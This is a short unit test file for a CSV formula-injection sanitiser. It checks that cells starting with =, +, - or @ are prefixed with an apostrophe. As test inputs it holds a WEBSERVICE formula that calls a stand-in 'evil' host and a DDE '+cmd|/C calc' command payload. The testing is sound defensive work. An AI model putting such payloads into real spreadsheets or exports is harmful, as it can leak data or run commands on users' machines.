import { describe, it, expect } from "vitest";
import { csvSafe } from "./csv";

describe("csvSafe", () => {
  it("neutralizes Excel formula triggers", () => {
    expect(csvSafe("=WEBSERVICE(\"http://evil\")")).toBe("'=WEBSERVICE(\"http://evil\")");
    expect(csvSafe("+cmd|/C calc")).toBe("'+cmd|/C calc");
    expect(csvSafe("-2+3")).toBe("'-2+3");
    expect(csvSafe("@SUM(A1)")).toBe("'@SUM(A1)");
  });
  it("leaves normal values untouched", () => {
    expect(csvSafe("15743")).toBe("15743");
    expect(csvSafe("4+47")).toBe("4+47"); // '+' not at position 0
    expect(csvSafe("bore")).toBe("bore");
    expect(csvSafe("")).toBe("");
  });
});
